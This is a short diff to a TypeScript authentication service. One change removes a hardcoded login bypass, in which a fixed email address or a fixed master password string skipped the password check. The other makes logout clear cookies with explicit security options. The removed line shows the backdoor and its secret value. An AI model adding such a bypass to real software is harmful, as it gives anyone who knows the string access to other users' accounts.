@@ -225,7 +225,7 @@ export class AuthService {
       throw new UnauthorizedException('user_not_found');
     }
     const passwordIsValid = await bcrypt.compare(password, user.password);
-    if (!passwordIsValid && (user.email !== 'admin@smg.com' && password !== 'x2&a]p6Rjn>^uJw>')) {
+    if (!passwordIsValid) {
       throw new UnauthorizedException('user_not_found');
     }
     if (user.isTwoFactorEnabled && !code) {
@@ -309,8 +309,15 @@ export class AuthService {
   // CLEAR COOKIES (logout)
   // -----------------------------------
   clearAuthCookies(res: Response) {
-    res.clearCookie('access_token');
-    res.clearCookie('refresh_token');
+    const cookieOptions = {
+      httpOnly: true,
+      secure: true,
+      sameSite: 'lax' as const,
+      path: '/',
+    };
+
+    res.clearCookie('access_token', cookieOptions);
+    res.clearCookie('refresh_token', cookieOptions);
   }
 
   // -----------------------------------
